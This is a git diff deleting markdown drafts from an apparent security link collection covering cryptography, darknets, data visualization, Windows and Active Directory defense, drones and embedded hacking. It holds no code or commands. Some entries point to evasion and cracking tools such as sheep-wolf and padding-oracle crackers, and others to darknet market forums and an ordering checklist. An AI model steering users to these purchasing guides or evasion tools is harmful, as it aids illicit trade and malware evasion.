-	*  Abstract: We revisit the question of constructing secure general-purpose indistinguishability obfuscation (iO), with a security reduction based on explicit computational assumptions over multi- linear maps. Previous to our work, such reductions were only known to exist based on meta- assumptions and/or ad-hoc assumptions: In the original constructive work of Garg et al. (FOCS 2013), the underlying explicit computational assumption encapsulated an exponential family of assumptions for each pair of circuits to be obfuscated. In the more recent work of Pass et al. (Crypto 2014), the underlying assumption is a meta-assumption that also encapsulates an exponential family of assumptions, and this meta-assumption is invoked in a manner that captures the specific pair of circuits to be obfuscated. The assumptions underlying both these works substantially capture (either explicitly or implicitly) the actual structure of the obfuscation mechanism itself.  In our work, we provide the first construction of general-purpose indistinguishability obfuscation proven secure via a reduction to a natural computational assumption over multilinear maps, namely, the Multilinear Subgroup Elimination Assumption. This assumption does not depend on the circuits to be obfuscated (except for its size), and does not correspond to the underlying structure of our obfuscator. The technical heart of our paper is our reduction, which gives a new way to argue about the security of indistinguishability obfuscation. 
-* [RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis](http://www.tau.ac.il/~tromer/acoustic/)
-	* Here, we describe a new acoustic cryptanalysis key extraction attack, applicable to GnuPG's current implementation of RSA. The attack can extract full 4096-bit RSA decryption keys from laptop computers (of various models), within an hour, using the sound generated by the computer during the decryption of some chosen ciphertexts. We experimentally demonstrate that such attacks can be carried out, using either a plain mobile phone placed next to the computer, or a more sensitive microphone placed 4 meters away.
-* [The SIGMA Family of Key-Exchange Protocols ]()
-	* Summary: SIGMA is a family of cryptographic key-exchange protocols that provide perfect forward secrecy via a Diffie-Hellman exchange authenticated with digital signatures. SIGMA is designed to support a variety of features and trade-offs required in common practical scenarios (such as identity protection and reduced number of protocol rounds) as well as to enjoy sound cryptographic security. This design puts forth the "SIGn-and-MAc" (SIGMA, for short) approach that carefully combines the use of digital signatures and MAC functions to guarantee an authenticated binding between the Diffie-Hellman key and the identities of the parties to the exchange. This simple approach resolves security shortcomings found in previous protocols. The SIGMA protocols serve as the cryptographic basis for the signature-based modes of the standardized Internet Key Exchange (IKE) protocol, and its current revision IKE version 2. 
-
-
-
-
-
-
-
-
-
-
-
-
-
------
-### <a name="software">Software</a>
-* [CONIKS](https://coniks.cs.princeton.edu/)
-	* CONIKS is a key management system for end users capable of integration in end-to-end secure communication services. The main idea is that users should not have to worry about managing encryption keys when they want to communicate securely, but they also should not have to trust their secure communication service providers to act in their interest. 
-* [The Noise Protocol Framework](http://noiseprotocol.org/noise.html)
-	* Noise is a framework for crypto protocols based on Diffie-Hellman key agreement. Noise can describe protocols that consist of a single message as well as interactive protocols.
-	* A Noise protocol begins with two parties exchanging handshake messages. During this handshake phase the parties exchange DH public keys and perform a sequence of DH operations, hashing the DH results into a shared secret key. After the handshake phase each party can use this shared key to send encrypted transport messages.
-* [VeraCrypt](https://www.veracrypt.fr/en/Home.html)
-	* VeraCrypt is a free open source disk encryption software for Windows, Mac OSX and Linux. Brought to you by IDRIX (https://www.idrix.fr) and based on TrueCrypt 7.1a.
-
-
-
-
-
-
------
-### <a name="steno">Stenography</a>
-* [imagejs](https://github.com/jklmnn/imagejs)
-	* imagejs is a small tool to hide javascript inside a valid image file. The image file is recognized as one by content checking software, e.g. the file command you might now from Linux or other Unix based operation systems.
-* [Real-time Steganography with RTP](http://uninformed.org/?v=all&a=36&t=sumry)
-	* Real-time Transfer Protocol (RTP) is used by nearly all Voice-over-IP systems to provide the audio channel for calls. As such, it provides ample opportunity for the creation of a covert communication channel due to its very nature. While use of steganographic techniques with various audio cover-medium has been extensively researched, most applications of such have been limited to audio cover-medium of a static nature such as WAV or MP3 file audio data. This paper details a common technique for the use of steganography with audio data cover-medium, outlines the problem issues that arise when attempting to use such techniques to establish a full-duplex communications channel within audio data transmitted via an unreliable streaming protocol, and documents solutions to these problems. An implementation of the ideas discussed entitled SteganRTP is included in the reference materials. 
-
------
-### Talks
-* [Hunting For Vulnerabilities In Signal - Markus Vervier - HITB 2017 AMS](https://www.youtube.com/watch?v=2n9HmllVftA)
-	* Signal is the most trusted secure messaging and secure voice application, recommended by Edward Snowden and the Grugq. And indeed Signal uses strong cryptography, relies on a solid system architecture, and you’ve never heard of any vulnerability in its code base. That’s what this talk is about: hunting for vulnerabilities in Signal. We will present vulnerabilities found in the Signal Android client, in the underlying Java libsignal library, and in example usage of the C libsignal library. Our demos will show how these can be used to crash Signal remotely, to bypass the MAC authentication for certain attached files, and to trigger memory corruption bugs. Combined with vulnerabilities in the Android system it is even possible to remotely brick certain Android devices. We will demonstrate how to initiate a permanent boot loop via a single Signal message. We will also describe the general architecture of Signal, its attack surface, the tools you can use to analyze it, and the general threat model for secure mobile communication apps.
-
-
-
-
-
-
-
-
------
-### <a name="tools">Tools</a>
-* [Cryptographic Implementations Analysis Toolkit (CIAT)](http://ciat.sourceforge.net/)
-	* The Cryptographic Implementations Analysis Toolkit (CIAT) is compendium of command line and graphical tools whose aim is to help in the detection and analysis of encrypted byte sequences within files (executable and non-executable).
-* [Simple crypto tools](http://rumkin.com/tools/)
-* [keyCzar](http://www.keyczar.org/)
-	* Keyczar is an open source cryptographic toolkit designed to make it easier and safer for developers to use cryptography in their applications. Keyczar supports authentication and encryption with both symmetric and asymmetric keys.
-* [Decrypto](http://sourceforge.net/projects/decrypto/)
-	* In DeCrypto you will find a collection of scripts for helping decrypt messages.\
-* [RELIC](https://github.com/relic-toolkit/relic)
-	* RELIC is a modern cryptographic meta-toolkit with emphasis on efficiency and flexibility. RELIC can be used to build efficient and usable cryptographic toolkits tailored for specific security levels and algorithmic choices.
-* [quipqiup](http://quipqiup.com/)
-	* quipqiup is a fast and automated cryptogram solver by Edwin Olson. It can solve simple substitution ciphers often found in newspapers, including puzzles like cryptoquips (in which word boundaries are preserved) and patristocrats (in which word boundaries aren't).
-* [HashID](https://github.com/psypanda/hashID)
-	* hashID is a tool written in Python 3 which supports the identification of over 220 unique hash types using regular expressions. It is able to identify a single hash, parse a file or read multiple files in a directory and identify the hashes within them. hashID is also capable of including the corresponding hashcat mode and/or JohnTheRipper format in its output. hashID works out of the box with Python 2 = 2.7.x or Python 3 = 3.3 on any platform.
-* [dislocker](https://github.com/Aorimn/dislocker)
-	* FUSE driver to read/write Windows' BitLocker-ed volumes under Linux / Mac OSX
-* [HiVE — Hidden Volume Encryption](http://hive.ccs.neu.edu/#four)
-* [sheep-wolf](https://github.com/silentsignal/sheep-wolf/)
-	* Some security tools still stick to MD5 when identifying malware samples years after practical collisions were shown against the algorithm. This can be exploited by first showing these tools a harmless sample (Sheep) and then a malicious one (Wolf) that have the same MD5 hash. Please use this code to test if the security products in your reach use MD5 internally to fingerprint binaries and share your results by issuing a pull request updating the contents of results/!
-* [pypadbuster](https://github.com/escbar/pypadbuster)
-	* A Python version of PadBuster.pl by Gotham Digital Security (GDSSecurity on Github)
-* [padex](https://github.com/szdavid92/padex)
-	* The goal of this challenge is to find a flag contained in an encrypted message. A decryption oracle and the encrypted message is provided. The student should write an application that cracks the cyphertext by abusing the oracle which is vulnerable to the padding attack.
-* [Project HashClash](https://marc-stevens.nl/p/hashclash/)
-	* Project HashClash is a Framework for MD5 & SHA-1 Differential Path Construction and Chosen-Prefix Collisions for MD5. It's goal is to further understanding and study of the weaknesses of MD5 and SHA-1. 
-* [CPC-MD5](https://github.com/dingelish/cpc-md5)
-	* This project is forked from Marc Steven's Hashclash project hashclash and follows GPL.
-
-
-
------
-### <a name="books">Books</a>:
-* Cryptography Engineering
-* Applied Cryptography
-
-
-
------
-### <a name="libraries"></a>Crypto Libraries/Protocols
-* [OMEMO Multi-End Message and Object Encryption](https://conversations.im/omemo/)
-	* OMEMO is an XMPP Extension Protocol (XEP) for secure multi-client end-to-end encryption. It is an open standard based on a Double Ratchet and PEP which can be freely used and implemented by anyone. The protocol has been audited by a third party.
-* [The Legion of the Bouncy Castle](https://www.bouncycastle.org/)
-
-
-
------
-### <a name="misc"></a>Miscellaneous
-* [SSH Bad Keys](https://github.com/rapid7/ssh-badkeys)
-	* This is a collection of static SSH keys (host and authentication) that have made their way into software and hardware products. This was inspired by the Little Black Box project, but focused primarily on SSH (as opposed to TLS) keys.
-* [House of Keys](https://github.com/sec-consult/houseofkeys)
-
-
-
diff --git a/Draft/Darknets.md b/Draft/Darknets.md
deleted file mode 100755
index acdef30..0000000
--- a/Draft/Darknets.md
+++ /dev/null
@@ -1,53 +0,0 @@
-## Darknets
-
-##### ToC
-
-* [General](#general)
-* [Darknets](#darknets)
-* [Discussions](#discussion)
-* [Ordering](#ordering)
-* [Markets/Sites/Wikis](#markets)
-* [Tools](#tools)
-
-
-### <a name="general">General</a>
-General
-* Don't think that because information posted here is valid/trustworthy. This is a dumping spot for my personal reference. This does not mean that markets/sites I post are legit/safe. 
-* 101
-	* [Touring the Darkside of the Internet. An Introduction to Tor - Defcon22](https://www.youtube.com/watch?v=To5yarfAg_E)
-	* [Darknet Dictionary ](http://www.deepdotweb.co/2014/03/02/deepdotwebs-darknet-dictionary/)
-	* [Darknets intro vid - educational](https://www.youtube.com/watch?v=tjJYC2LuJl0)
-	* [For Darknet Noobs](https://www.reddit.com/r/DarkNetMarketsNoobs)
-* Documentation
-	* [Tor black-market-related arrests](http://www.gwern.net/Black-market%20arrests#evolution)
-		* I compile a table and discussion of all known arrests and prosecutions related to Tor-Bitcoin black-markets such as Silk Road 1, along with discussion of how they came to be arrested.
-* Educational
-	* [Ordering Checklist](https://www.reddit.com/r/DarkNetMarketsNoobs/wiki/completeorderingchecklist)
-* General
-	* [Site list: (NO CP)](http://belsec.skynetblogs.be/deepnet-the-tor-onion-directory-of-things-that-work-today.html)
-	* [Deep Dot Web](http://www.deepdotweb.co/)
-* Markets
-	* [Market Discussions](https://www.reddit.com/r/DarkNetMarkets)
-* Tools
-	* [Tor Search engine.](https://ahmia.fi/search/)
-* Wikis
-
-
-
-### <a name="darknets">Darknets</a>
-Darknets
-* Freenet
-* I2P
-* Tor
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Data AnalysisVisualization.md b/Draft/Data AnalysisVisualization.md
deleted file mode 100755
index c4ca19b..0000000
--- a/Draft/Data AnalysisVisualization.md	
+++ /dev/null
@@ -1,115 +0,0 @@
-# Data Visualization
-
-
-
-### ToC
-* Cull
-* General
-* Writeups
-* Tools
-* Miscellaneous
-
-
-
-
-
-
-### To Do
-* Split into Data visualization/Working with data
-
-
-#### Cull
-
-[Just-Metadata](https://github.com/ChrisTruncer/Just-Metadata)
-* Just-Metadata is a tool that can be used to gather intelligence information passively about a large number of IP addresses, and attempt to extrapolate relationships that might not otherwise be seen. Just-Metadata has "gather" modules which are used to gather metadata about IPs loaded into the framework across multiple resources on the internet. Just-Metadata also has "analysis" modules. These are used to analyze the data loaded Just-Metadata and perform various operations that can identify potential relationships between the loaded systems.
-
-
-
-Apache Nifi - supports powerful and scalable directed graphs of data routing, transformation, and system mediation logic.
-https://nifi.apache.org/
-
-http://linkurio.us/toolkit/
-
-http://marvl.infotech.monash.edu/webcola/
-
-http://www.yasiv.com/graphs#Bai/rw496
-
-http://plaso.kiddaland.net/
-
-Check out http://secviz.org/
-
-http://sourceforge.net/projects/rapidminer/
-
-http://orange.biolab.si/
-
-https://rapidminer.com/
-
-
-http://ipython.org/
-
-https://www.documentcloud.org/home
-
-http://www.pentaho.com/
-
-Applied Security Visualization: http://www.secviz.org/content/applied-security-visualization
-
-[Scriptorium-LE](https://github.com/imifos/Scriptorium-LE/)
-* A Linux machine state enumeration, data visualisation and analysis tool.
-
-#### End Cull
-
------
-### Tools
-* [d3js(Data Driven Documents)](http://d3js.org/)
-	* D3.js is a JavaScript library for manipulating documents based on data. D3 helps you bring data to life using HTML, SVG, and CSS. D3’s emphasis on web standards gives you the full capabilities of modern browsers without tying yourself to a proprietary framework, combining powerful visualization components and a data-driven approach to DOM manipulation. 
-* [Data Science Toolkit](https://github.com/petewarden/dstk)
-	* A collection of the best open data sets and open-source tools for data science, wrapped in an easy-to-use REST/JSON API with command line, Python and Javascript interfaces. Available as a self-contained VM or EC2 AMI that you can deploy yourself.
-	* [Documentation](http://www.datasciencetoolkit.org/developerdocs)
-* [ORA](http://www.casos.cs.cmu.edu/projects/ora/)
-	* ORA is a dynamic meta-network assessment and analysis tool developed by CASOS at Carnegie Mellon.  It contains hundreds of social network, dynamic network metrics, trail metrics, procedures for grouping nodes, identifying local patterns, comparing and contrasting networks, groups, and individuals from a dynamic meta-network perspective. *ORA has been used to examine how networks change through space and time,  contains procedures for moving back and forth between trail data (e.g. who was where when) and network data (who is connected to whom,  who is connected to where …),  and has a variety of geo-spatial network metrics, and change detection techniques.  *ORA can handle multi-mode, multi-plex, multi-level networks.  It can identify key players, groups and vulnerabilities, model network changes over time, and perform COA analysis.  It has been tested with large networks (106 nodes per 5 entity classes).Distance based, algorithmic, and statistical procedures for comparing and contrasting networks are part of this toolkit.  Based on network theory, social psychology, operations research, and management theory a series of measures of “criticality” have been developed at CMU.  Just as critical path algorithms can be used to locate those tasks that are critical from a project management perspective, the *ORA algorithms can find those people, types of skills or knowledge and tasks that are critical from a performance and information security perspective. 
-* [pewpew](https://github.com/hrbrmstr/pewpew)
-	* In all seriousness, IPew provides a simple framework - based on Datamaps - for displaying cartographic attack data in a (mostly) responsive way and shows how to use dynamic data via javascript event timers and data queues (in case you're here to learn vs have fun - or both!). You can customize the display through a myriad of query string options, including sounds.
-* [Data Maps](https://datamaps.github.io/)
-	* Customizable SVG map visualizations for the web in a single Javascript file using D3.js
-* [Import.IO](https://import.io/)
-	* Use our tool to build APIs to all your favorite websites with just a few clicks of the mouse.  - Data Scraping
-* [kippo-graph](https://github.com/ikoniaris/kippo-graph)
-	* Visualize statistics from a Kippo SSH honeypot 
-* [simgaJS-webcola](https://github.com/qinfchen/sigmajs-webcola)
-	* webcola plugin for sigmajs 
-* [Airodump-NG Scan Visualizer](http://hackoftheday.securitytube.net/2015/03/airodump-ng-scan-visualizer-ver-01.html)	
-* [Graphite - Scalable Realtime Graphing](http://graphite.wikidot.com/start) 
-	* [Quick Start Guide](http://graphite.wikidot.com/quickstart-guide)
-* [StatsD](https://github.com/etsy/statsd/)
-	* A network daemon that runs on the Node.js platform and listens for statistics, like counters and timers, sent over UDP or TCP and sends aggregates to one or more pluggable backend services (e.g., Graphite).
-* [Kismet Log Viewer - KLV](http://mindflip.org/klv/)
-	* The Kismet Log Viewer (KLV) takes Kismet .xml log files and produces a nicely formatted html interface to browse the logs with. KLV has the ability to utilize available GPS information to create links for external maps via the net, and provides the ability for those with Snort to generate a page of Snort output for each specific bssid that has data available. KLV also comes with my Kismet Log Combiner script to help users consolidate multiple .xml and .dump log files.
-* [plaso](https://github.com/log2timeline/plaso)
-	* plaso (Plaso Langar Að Safna Öllu) is a Python-based backend engine for the tool log2timeline. 
-* [huginn](https://github.com/huginn/huginn)
-	* Create agents that monitor and act on your behalf. Your agents are standing by! Huginn is a system for building agents that perform automated tasks for you online. They can read the web, watch for events, and take actions on your behalf. Huginn's Agents create and consume events, propagating them along a directed graph. Think of it as a hackable version of IFTTT or Zapier on your own server. You always know who has your data. You do.
-* [Norikra](http://norikra.github.io/)
-	* Norikra is a open source server software provides "Stream Processing" with SQL, written in JRuby, runs on JVM, licensed under GPLv2.
-* [Fluentd](https://www.fluentd.org/architecture)
-	* Fluentd is an open source data collector, which lets you unify the data collection and consumption for a better use and understanding of data.
-
-Modeling Network Data
-* [Flowsynth](https://github.com/secureworks/Flowsynth)
-	* Flowsynth is a tool for rapidly modelling network traffic. Flowsynth can be used to generate text-based hexdumps of packets as well as native libpcap format packet captures.
-
-
-
-
------
-### Blogposts
-
-
-
-
-
------
-### Writeups
-* [Generalizing Data Flow Information](http://uninformed.org/?v=all&a=34&t=sumry)
-	* Generalizing information is a common method of reducing the quantity of data that must be considered during analysis. This fact has been plainly illustrated in relation to static data flow analysis where previous research has described algorithms that can be used to generalize data flow information. These generalizations have helped support more optimal data flow analysis in certain situations. In the same vein, this paper describes a process that can be employed to generalize and persist data flow information along multiple generalization tiers. Each generalization tier is meant to describe the data flow behaviors of a conceptual software element such as an instruction, a basic block, a procedure, a data type, and so on. This process makes use of algorithms described in previous literature to support the generalization of data flow information. To illustrate the usefulness of the generalization process, this paper also presents an algorithm that can be used to determine reachability at each generalization tier. The algorithm determines reachability starting from the least specific generalization tier and uses the set of reachable paths found to progressively qualify data flow information for each successive generalization tier. This helps to constrain the amount of data flow information that must be considered to a minimal subset. 
-*[Using amCharts to Create Beautiful Wireshark Visualizations](http://www.thevisiblenetwork.com/2015/03/19/using-amcharts-to-create-beautiful-wireshark-visualizations/)
-* [Drawing effective network diagrams](https://www.auvik.com/media/blog/effective-network-diagrams/)
diff --git a/Draft/Defense.md b/Draft/Defense.md
deleted file mode 100644
index 36d6b15..0000000
--- a/Draft/Defense.md
+++ /dev/null
@@ -1,249 +0,0 @@
-
-
-# Defense:
-
-
-
-#### In Progress
-
-https://github.com/KurtDeGreeff/awesome-windows-domain-hardening
-
-https://github.com/k4m4/kickthemout
-
-https://github.com/iadgov/Secure-Host-Baseline
-
-[git-secrets](https://github.com/awslabs/git-secrets)
-* Prevents you from committing passwords and other sensitive information to a git repository.
-
-[keynuker](https://github.com/tleyden/keynuker)
-* KeyNuker scans public activity across all Github users in your Github organization(s) and proactively deletes any AWS keys that are accidentally leaked. It gets the list of AWS keys to scan by directly connecting to the AWS API.
-
-https://github.com/gfoss/PSRecon
-
-[Securing Windows with Group Policy Josh Rickard - Derbycon7](https://www.youtube.com/watch?v=Upeaa2rgozk&index=66&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-* 
-https://github.com/silverhack/voyeur
-
-https://github.com/intrigueio/intrigue-core
-
-https://github.com/nbs-system/naxsi
-
-https://github.com/ernw/hardening
-
-https://www.youtube.com/watch?v=7XnkDsOZM3Y&index=16&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3
-
-https://www.malwarearchaeology.com/logging/
-
-https://github.com/iadgov/Secure-Host-Baseline
-
-https://technet.microsoft.com/library/security/4053440
-
-
-https://criticalinformatics.com/how-i-learned-to-trust-my-shell-microsoft-powershell/?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&refsrc=email&iid=7832f4ea811a4bc7b33409dacf81eb7f&uid=150127534&nid=244+281088008
-
-https://github.com/palantir/osquery-configuration/blob/master/README.md
-
-
-https://github.com/refractionpoint/limacharlie
-
-https://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf
-
-https://www.blackhillsinfosec.com/build-super-secure-active-directory-infrastructure/
-
-
-https://www.blackhillsinfosec.com/the-creddefense-toolkit/
-
-[Simple WMI Trace Viewer in PowerShell](https://chentiangemalc.wordpress.com/2017/03/24/simple-wmi-trace-viewer-in-powershell/)
-
-
-[ESA-Process-Maturity](https://github.com/Brockway/ESA-Process-Maturity)
-* Tools to measure the maturity of Enterprise Security Architecture processes
-* https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project
-
-[Active Directory: Real Defense for Domain Admins](https://www.irongeek.com/i.php?page=videos/derbycon4/t213-active-directory-real-defense-for-domain-admins-jason-lang)
-* Did your AD recently get owned on a pentest? It’s always fun to see an unknown entry show up in your Domain Admins group (#fail). Come learn how to truly protect your organization’s IT crown jewels from some of the most popular AD attacks. If you’re stuck trying to figure out what to do with null sessions, pass the hash techniques, or protecting your Domain Admins, then you will want to be here.
-
-[Active Directory Design Best Practices](https://krva.blogspot.com/2008/04/ad-design-best-practices.html)
-
-[Application Whitelisting Using Microsoft AppLocker](https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm)
-
-[Just Enough Administration Samples and Resources](https://github.com/PowerShell/JEA)
-* Just Enough Administration (JEA) is a PowerShell security technology that provides a role based access control platform for anything that can be managed with PowerShell. It enables authorized users to run specific commands in an elevated context on a remote machine, complete with full PowerShell transcription and logging. JEA is included in PowerShell version 5 and higher on Windows 10 and Windows Server 2016, and older OSes with the Windows Management Framework updates.
-
-
-[Detecting DLL Hijackingon Windows](http://digital-forensics.sans.org/blog/2015/03/25/detecting-dll-hijacking-on-windows/)
-
-[Second section good resource for hardening windows](http://labs.bitdefender.com/2014/11/do-your-bit-to-limit-cryptowall/)
-
-[GPO Best Policies](http://www.grouppolicy.biz/best-practices/)
-
-http://www.scriptjunkie.us/2013/06/fixing-pass-the-hash-and-other-problems/
-
-
-[Analyzing Malicious Documents Cheat Sheet](https://zeltser.com/analyzing-malicious-documents/)
-
-https://www.dsinternals.com/en/
-
-[Monit](https://mmonit.com/monit/)
-* Monit is a small Open Source utility for managing and monitoring Unix systems. Monit conducts automatic maintenance and repair and can execute meaningful causal actions in error situations.
-
-[Mitigating Kerberos Golden Tickets:](http://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf)
-
-https://sysforensics.org/2014/01/know-your-windows-processes.html
-
-
-https://media.blackhat.com/us-13/US-13-Duckwall-Pass-the-Hash-Slides.pdf
-* Protecting against Pass-The-Hash and other techniques
-
-
-http://www.grouppolicy.biz/2011/06/best-practices-group-policy-for-wsus/
-
-
-
-[Decryptonite](https://github.com/DecryptoniteTeam/Decryptonite)
-* Decryptonite is a tool that uses heuristics and behavioural analysis to monitor for and stop ransomware.
-
-[BEAMGUN](https://github.com/JLospinoso/beamgun)
-* A rogue-USB-device defeat program for Windows. 
-
-[Defending against mimikatz](https://jimshaver.net/2016/02/14/defending-against-mimikatz/)
-
-
-[Mitigating Pass-the-Hash Attacks and other credential Theft-version2](http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating-Pass-the-Hash-Attacks-and-Other-Credential-Theft-Version-2.pdf)
-* Official MS paper.
-
-[Windows Firewall Hook Enumeration](https://www.nccgroup.com/en/blog/2015/01/windows-firewall-hook-enumeration/)
-* We’re going to look in detail at Microsoft Windows Firewall Hook drivers from Windows 2000, XP and 2003. This functionality was leveraged by the Derusbi family of malicious code to implement port-knocking like functionality. We’re going to discuss the problem we faced, the required reverse engineering to understand how these hooks could be identified and finally how the enumeration tool was developed.
-
-[Windows ISV Software Security Defenses](https://msdn.microsoft.com/en-us/library/bb430720.aspx)
-
-[Harden windows IP Stack](https://www.reddit.com/r/netsec/comments/2sg80a/how_to_harden_windowsiis_ssltls_configuration/)
-
-
-
-[The 10 Windows group policy settings you need to get right](http://www.infoworld.com/article/2609578/security/the-10-windows-group-policy-settings-you-need-to-get-right.html?page=2)
-
-
-
-
-
-[Windows Performance Toolkit Reference](http://msdn.microsoft.com/en-us/library/windows/hardware/hh162945.aspx)
-
-[Powershell Security at Enterprise Customers](https://blogs.msdn.microsoft.com/daviddasneves/2017/05/25/powershell-security-at-enterprise-customers/)
-
-
-[AIL framework - Analysis Information Leak framework](https://github.com/CIRCL/AIL-framework)
-* AIL is a modular framework to analyse potential information leaks from unstructured data sources like pastes from Pastebin or similar services or unstructured data streams. AIL framework is flexible and can be extended to support other functionalities to mine sensitive information.
-
-[Linux workstation security checklist](https://github.com/lfit/itpol/blob/master/linux-workstation-security.md)
-
-[Uproot](https://github.com/Invoke-IR/Uproot)
-* Uproot is a Host Based Intrusion Detection System (HIDS) that leverages Permanent Windows Management Instrumentation (WMI) Event Susbcriptions to detect malicious activity on a network. For more details on WMI Event Subscriptions please see the WMIEventing Module
-
-
-[What would a real hacker do to your Active Directory](https://www.youtube.com/watch?v=DH3v8bO-NCs)
-
-
-[Mozilla's OpenSSH Configuration guide](https://wiki.mozilla.org/Security/Guidelines/OpenSSH)
-
-Use Invoke-HoneyCreds to distribute fake cred throughout environment as "legit" service account and monitor for use of creds
-
-
-[SMB Packet Signing](https://technet.microsoft.com/en-us/library/cc180803.aspx)
-
-
-[Public:Windows Event Log Zero 2 Hero Slides](https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit#slide=id.g21acf94f3f_2_27)
-
-
-
-[Blocking Remote Use of Local Accounts](https://blogs.technet.microsoft.com/secguide/2014/09/02/blocking-remote-use-of-local-accounts/)
-
-
-http://www.leeholmes.com/blog/2016/10/22/more-detecting-obfuscated-powershell/
-
-
-The Hitchhiker's Guide to SQL Injection prevention - https://phpdelusions.net/sql_injection
-
-
-[Amazon S3 Bucket Public Access Considerations](https://aws.amazon.com/articles/5050)
-
-[Filenames and Pathnames in Shell: How to do it Correctly](https://www.dwheeler.com/essays/filenames-in-shell.html)
-
-[Threats and Countermeasures Guide: Security Settings in Windows Server 2008 R2 and Windows 7 - technet](https://technet.microsoft.com/en-us/library/hh125921.aspx)
-
-
-[Securi-Tay 2017 - Advanced Attack Detection](https://www.youtube.com/watch?v=ihElrBBJQo8)
-* 
-
-[Common misconfigurations that lead to a breach - Justin Tharpe](https://www.youtube.com/watch?v=fI3mycr5cPg)
-
-
-[Securing Windows Workstations: Developing a Secure Baseline](https://adsecurity.org/?p=3299)
-
-[PowerShell Security at Enterprise Customers - msdn](https://blogs.msdn.microsoft.com/daviddasneves/2017/05/25/powershell-security-at-enterprise-customers/)
-
-[Assimilator](https://github.com/videlanicolas/assimilator)
-* Automatic firewall rule orchestator.
-
-[Uproot](https://github.com/Invoke-IR/Uproot)
-* Uproot is a Host Based Intrusion Detection System (HIDS) that leverages Permanent Windows Management Instrumentation (WMI) Event Susbcriptions to detect malicious activity on a network. For more details on WMI Event Subscriptions please see the WMIEventing Module
-
-[WMIEvent](https://github.com/Invoke-IR/WMIEvent)
-* A PowerShell module to abstract the complexities of Permanent WMI Event Subscriptions
-
-
-[LUNAR](https://github.com/lateralblast/lunar)
-* A UNIX security auditing tool based on several security frameworks
-
-
-[OverSight](https://objective-see.com/products/oversight.html)
-* OverSight monitors a mac's mic and webcam, alerting the user when the internal mic is activated, or whenever a process accesses the webcam. 
-
-
-[Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory](http://adsecurity.org/?p=1515)
-
-
-[How to Efficiently Protect AD from Credential Theft & Compromise - Friedwart Kuhn - Troopers15](https://www.youtube.com/watch?v=I4mb0UciqlY)
-
-[Defending the Enterprise Against Network Infrastructure Attacks  - Paul Coggin - Troopers15](https://www.youtube.com/watch?v=K0X3RDf5XK8)
-
-[Kerberos Golden Ticket: Mitigating pass the ticket on Active Directory](http://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf)
-
-[TaskExplorer](https://objective-see.com/products/taskexplorer.html)
-* Explore all the tasks (processes) running on your Mac with TaskExplorer. 
-
-
-[Password Policy - technet](https://technet.microsoft.com/en-us/library/hh994572.aspx)
-
-[Account lockout threshold - technet](https://technet.microsoft.com/en-us/library/hh994574.aspx)
-
-[Guide to Application Whitelisting - NIST Special Publication 800 - 167](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-167.pdf)
-
-[Script Rules in AppLocker - technet](https://technet.microsoft.com/en-us/library/ee460958.aspx)
-
-[DLL Rules in AppLocker](https://technet.microsoft.com/en-us/library/ee460947.aspx)
-
-[Microsoft Security Advisory 2871997](https://technet.microsoft.com/library/security/2871997)
-* [Microsoft Security Advisory: Update to improve credentials protection and management: May 13, 2014](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)
-[Windows Defender Device Guard deployment guide - docs ms](https://docs.microsoft.com/en-us/windows/device-security/device-guard/device-guard-deployment-guide)
-
-
-### Active Directory
-
-
-
-
-### Baselining
-
-[Measure Boot Performance with the Windows Assessment and Deployment Toolkit](https://blogs.technet.microsoft.com/mspfe/2012/09/19/measure-boot-performance-with-the-windows-assessment-and-deployment-toolkit/)
-
-[Evaluate Fast Startup Using the Assessment Toolkit](https://docs.microsoft.com/en-us/windows-hardware/test/wpt/optimizing-performance-and-responsiveness-exercise-1)
-
-
-
-### OS X
-[netman](https://github.com/iadgov/netman)
-* A userland network manager with monitoring and limiting capabilities for macOS.
-
-[netfil](https://github.com/iadgov/netfil)
-* A kernel network manager with monitoring and limiting capabilities for macOS.
\ No newline at end of file
diff --git a/Draft/Drones.md b/Draft/Drones.md
deleted file mode 100755
index 82d8782..0000000
--- a/Draft/Drones.md
+++ /dev/null
@@ -1,10 +0,0 @@
-## Drone Hacking
-
-
-
---------
-### General
-* [ArduPilot](http://ardupilot.org/ardupilot/index.html)
-* [Knocking my neighbors kids cruddy drone offline - DefCon 23 Robinson and Mitchell](https://www.youtube.com/watch?v=5CzURm7OpAA)
-* [Game of Drones - Brown,Latimer - Defcon25](https://www.youtube.com/watch?v=iG7hUE2BZZo)
-	* We’ve taken a MythBusters-style approach to testing the effectiveness of a variety of drone defense solutions, pitting them against our DangerDrone. Videos demonstrating the results should be almost as fun for you to watch as they were for us to produce. Expect to witness epic aerial battles against an assortment of drone defense types
\ No newline at end of file
diff --git a/Draft/Embedded Device & Hardware Hacking -.md b/Draft/Embedded Device & Hardware Hacking -.md
deleted file mode 100755
index c724669..0000000
--- a/Draft/Embedded Device & Hardware Hacking -.md	
+++ /dev/null
@@ -1,430 +0,0 @@
-##Embedded Device Security
-
-https://en.wikipedia.org/wiki/Embedded_system
-
-##### ToC
-* [General](#general)
-* [General Hardware Hacking](#generalhw)
-* [General Hardware Articles/Writeups](#generalwriteups)
-* [General Hardware Hacking Talks/Presentations](#generaltalks)
-* [General Hardware Hacking Tools](#generaltools)
-* [Attacking Routers](#routers)
-* [Cable Modem Hacking](#modem)
-* [Educational/Information on things you wouldn't find in a Dictionary](#education)
-* [Flash Memory](#flash)
-* [Internet of Things](#iot)
-* [General Tools(S/W & H/W)](#gentools)
-* [Miscellaneous](#misc)
-* [PCI](#PCI)
